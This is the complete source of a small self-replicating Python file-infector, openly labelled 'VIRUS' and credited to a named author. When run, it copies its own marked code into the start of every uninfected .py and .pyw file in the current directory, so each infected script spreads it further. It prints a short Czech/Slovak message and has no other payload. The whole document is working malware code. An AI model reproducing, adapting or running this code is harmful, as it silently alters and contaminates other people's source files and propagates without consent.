### START OF VIRUS ###
# author Dominik Capkovic 
# contact: domcapkovic@gmail.com; https://www.linkedin.com/in/dominik-čapkovič-b0ab8575/
# GitHub: https://github.com/kilimetr



import sys, glob

code = []

with open(sys.argv[0], "r") as f:
	lines = f.readlines()
	
virus_area = False

for line in lines:
	if line == "### START OF VIRUS ###\n":
		virus_area = True
	
	if virus_area == True:
		code.append(line)
	
	if line == "### END OF VIRUS ###\n":
		break

python_scripts = glob.glob("*.py") + glob.glob("*.pyw")
print(python_scripts)


for script in python_scripts:
	with open(script, "r") as f:
		script_code = f.readlines()
	
	infected = False
	for line in script_code:
		if line == "### START OF VIRUS ###\n":
			infected = True
			break
	
	if not infected:
		final_code = []
		final_code.extend(code)
		final_code.extend("\n")
		final_code.extend(script_code)
		
		with open(script, "w") as f:
			f.writelines(final_code)



print("SKRIPT BYL SPUŠTĚN")


### END OF VIRUS